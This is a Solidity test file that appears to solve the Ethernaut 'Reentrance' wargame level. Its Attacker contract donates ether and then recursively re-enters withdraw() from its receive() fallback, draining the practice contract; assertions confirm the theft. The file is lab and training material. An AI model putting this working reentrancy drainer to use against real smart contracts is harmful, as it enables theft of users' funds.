// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Reentrance.sol";
import "src/levels/ReentranceFactory.sol";

contract TestReentrance is BaseTest {
    Reentrance private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ReentranceFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Reentrance(levelAddress);

        // Check that the contract is correctly setup
        assertEq(address(level).balance, 0.001 ether);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // Reentrance contract is vulnerable to reentrancy attack
        // We can only request upto the amount we donated when withdrawing,
        // so we are donating the same amount that the contract already has so that we can drain
        // all the funds by re-entering just once
        Attacker attacker = new Attacker{value: 0.001 ether}(level);

        attacker.attack();

        assertEq(address(level).balance, 0);

        // 0.001 was already in the contract, we donated 0.001 ether so
        // total ether balance in the Reentrance contract was 0.002 ether
        assertEq(address(attacker).balance, 0.002 ether);

        vm.stopPrank();
    }
}

contract Attacker {
    Reentrance public level;

    constructor(Reentrance _level) public payable {
        level = _level;
        level.donate{value: 0.001 ether}(address(this));
    }

    function attack() external {
        level.withdraw(0.001 ether);
    }

    receive() external payable {
        if (address(level).balance > 0) {
            level.withdraw(0.001 ether);
        }
    }
}
